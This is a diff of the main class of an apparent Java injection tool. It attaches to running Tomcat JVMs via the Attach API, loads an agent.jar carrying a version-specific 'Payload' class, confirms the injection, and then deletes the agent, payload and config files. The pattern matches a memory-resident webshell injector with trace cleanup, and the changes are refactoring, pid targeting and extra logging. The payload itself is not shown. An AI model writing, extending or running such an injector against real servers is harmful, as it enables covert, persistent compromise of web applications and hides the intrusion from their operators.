@@ -1,6 +1,6 @@
 import com.sun.tools.attach.VirtualMachine;
 import com.sun.tools.attach.VirtualMachineDescriptor;
-import cons.Constant;
+import cons.Constants;
 import util.ClientUtil;
 import util.FileUtil;
 import util.Logger;
@@ -20,9 +20,7 @@ public class Main {
         String assignName = map.get("assignName");
         String tomcat_version = map.get("tomcat_version");
 
-        Logger.print("Will start in 3 seconds...");
-        Thread.sleep(3000);
-        String localDir = Constant.LOCAL_DIR;
+        String localDir = Constants.LOCAL_DIR;
         // Check whether the target application is started.
         while (!WebAppCheck.check()) {
             Logger.print("The target port is not open. Continue to try after 10 seconds...");
@@ -32,25 +30,24 @@ public class Main {
         // release lib jars
         FileUtil.releaseLibJar();
         // release agent.jar
-        FileUtil.releaseFile("/agent/agent.jar", Constant.AGENT);
-        // Generate web server configuration file
-        FileUtil.generateConfig();
+        FileUtil.releaseFile("/agent/agent.jar", Constants.AGENT);
 
         String[] payloadPathArray = {
-                "/payload/payload-tomcat-7.txt",
-                "/payload/payload-tomcat-8.txt",
-                "/payload/payload-tomcat-9.txt"
+                Constants.TOMCAT_CLASS_DIR + "tomcat7.cls",
+                Constants.TOMCAT_CLASS_DIR + "tomcat8.cls",
+                Constants.TOMCAT_CLASS_DIR + "tomcat9.cls"
         };
         List<VirtualMachineDescriptor> list = VirtualMachine.list();
-        Constant.AGENT_JAR_PATH = localDir + "/" + Constant.AGENT;
+        Constants.AGENT_JAR_PATH = localDir + "/" + Constants.AGENT;
         boolean deleteStarter = true;
         List<String> pids = new ArrayList<String>();
-        Logger.print("local_pid：" + Constant.LOCAL_PID);
-        pids.add(Constant.LOCAL_PID);
+        Logger.print("local_pid:" + Constants.LOCAL_PID);
+        pids.add(Constants.LOCAL_PID);
         label:
         for (VirtualMachineDescriptor vmd : list) {
             String pid = vmd.id();
-            if (vmd.displayName().equals(assignName) || "all".equals(assignName)) {
+            String displayName = vmd.displayName();
+            if (displayName.equals(assignName) || pid.equals(assignName) || "all".equals(assignName)) {
                 try {
                     String payloadPath;
                     switch (tomcat_version) {
@@ -64,21 +61,32 @@ public class Main {
                             payloadPath = payloadPathArray[2];
                             break;
                         default:
-                            System.err.println("Incorrect input format! \"tomcat_version\"");
+                            Logger.printErr("Incorrect input format! \"tomcat_version\"");
                             break label;
                     }
+
+                    Constants.START_ARGS = displayName;
+                    Constants.TOMCAT_VERSION = tomcat_version;
+                    // Generate web server configuration file
+                    FileUtil.generateConfig();
+
                     // release Payload
                     FileUtil.releaseFile(payloadPath, "Payload");
-                    VirtualMachine vm = VirtualMachine.attach(pid);
-                    vm.loadAgent(Constant.AGENT_JAR_PATH);
-                    vm.detach();
+
+                    Logger.print("injection process_name:" + Constants.START_ARGS);
+                    Logger.print("injection tomcat_version:" + Constants.TOMCAT_VERSION);
                     Logger.print("injection pid:" + pid);
+
+                    VirtualMachine vm = VirtualMachine.attach(pid);
+                    vm.loadAgent(Constants.AGENT_JAR_PATH);
+                    vm.detach();
+
                     // Check whether the current Tomcat version can be successfully injected
                     if ("true".equals(FileUtil.getAgentConfig("success"))) {
                         Logger.print("Injection successful");
                         pids.add(pid);
                     } else {
-                        System.err.println(payloadPath + "tomcat_version:" + tomcat_version + " Incorrect version, failed to inject successfully.");
+                        Logger.printErr(payloadPath + "tomcat_version:" + tomcat_version + " incorrect version, injection failed.");
                         Logger.tips();
                         deleteStarter = false;
                     }
@@ -91,12 +99,12 @@ public class Main {
 
         // clean up
         FileUtil.clean4windows(pids);
-        FileUtil.delFile(Constant.TMP_DIR, Constant.AGENT_CONFIG_FILE);
-        FileUtil.delFile(Constant.LOCAL_DIR, "Payload");
+        FileUtil.delFile(Constants.TMP_DIR, Constants.AGENT_CONFIG_FILE);
+        FileUtil.delFile(Constants.LOCAL_DIR, "Payload");
         FileUtil.delTmpLib();
         if (deleteStarter) {
-            FileUtil.delFile(localDir, Constant.AGENT_STARTER);
+            FileUtil.delFile(localDir, Constants.AGENT_STARTER);
         }
-        FileUtil.delFile(localDir, Constant.AGENT);
+        FileUtil.delFile(localDir, Constants.AGENT);
     }
 }
